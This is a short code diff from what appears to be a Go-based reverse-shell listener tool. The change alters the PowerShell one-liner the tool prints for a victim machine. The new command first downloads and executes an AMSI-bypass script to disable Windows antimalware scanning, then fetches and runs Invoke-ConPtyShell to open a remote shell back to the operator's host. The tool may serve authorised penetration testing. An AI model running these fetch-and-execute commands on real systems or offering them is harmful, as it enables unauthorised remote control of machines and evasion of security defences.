@@ -107,7 +107,7 @@ func SetOnlyWebserver(onlyWebserverString string) {
 		PrintOnlyWebserverOptions()
 		// If OnlyWebServer is enable we print the oneliner
 		if onlyWebserver {
-			log.Info("connect with: powershell IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell yourIP " + strconv.Itoa(OptionsSession.Port))
+			log.Info("connect with: powershell IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/amsi-bypass.ps1);IEX(IWR http://yourip:" + strconv.Itoa(OptionsSession.Port) + "/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell yourIP " + strconv.Itoa(OptionsSession.Port))
 		}
 		Restart()
 	} else {
